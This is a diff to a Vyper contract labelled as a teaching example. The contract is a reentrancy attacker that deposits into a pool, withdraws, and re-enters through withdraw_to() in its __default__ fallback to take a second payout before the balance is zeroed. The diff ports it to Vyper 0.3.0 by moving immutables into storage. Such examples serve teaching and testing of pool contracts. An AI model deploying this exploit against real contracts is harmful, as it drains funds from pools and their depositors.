@@ -1,10 +1,12 @@
-# @version 0.3.10
+# @version 0.3.0
 # TEACHING EXAMPLE. Do not deploy. See README.md.
 #
 # Deposits 1 unit, calls withdraw(), and when the payout runs this contract's
 # __default__ (only a native-asset payout does), re-enters through withdraw_to()
 # for a second payout before the ledger is zeroed. Against an ERC20 asset pool the
 # payout never calls back, so __default__ never fires and `reentered` stays False.
+#
+# Configuration lives in storage because Vyper 0.3.0 has no immutables.
 
 interface Pool:
     def deposit(amount: uint256): payable
@@ -14,8 +16,8 @@ interface Pool:
 interface ERC20:
     def approve(spender: address, amount: uint256) -> bool: nonpayable
 
-POOL: immutable(address)
-ASSET: immutable(address)   # empty for the native-asset pool
+POOL: address
+ASSET: address   # empty for the native-asset pool
 reentered: public(bool)
 
 
@@ -26,8 +28,8 @@ def __init__(_pool: address, _asset: address):
     @param _pool The pool to attack.
     @param _asset The pool's ERC20 asset, or the empty address if it pays the native asset.
     """
-    POOL = _pool
-    ASSET = _asset
+    self.POOL = _pool
+    self.ASSET = _asset
 
 
 @external
@@ -39,13 +41,13 @@ def attack(amount: uint256 = 0):
          asset pool it approves and deposits `amount`.
     @param amount Amount to deposit for the ERC20 asset pool; ignored when native.
     """
-    if ASSET == empty(address):
-        Pool(POOL).deposit(0, value=msg.value)
+    if self.ASSET == empty(address):
+        Pool(self.POOL).deposit(0, value=msg.value)
     else:
-        ERC20(ASSET).approve(POOL, amount)
-        Pool(POOL).deposit(amount)
+        ERC20(self.ASSET).approve(self.POOL, amount)
+        Pool(self.POOL).deposit(amount)
 
-    Pool(POOL).withdraw()
+    Pool(self.POOL).withdraw()
 
 
 @external
@@ -58,4 +60,4 @@ def __default__():
     """
     if not self.reentered:
         self.reentered = True
-        Pool(POOL).withdraw_to(self)
+        Pool(self.POOL).withdraw_to(self)
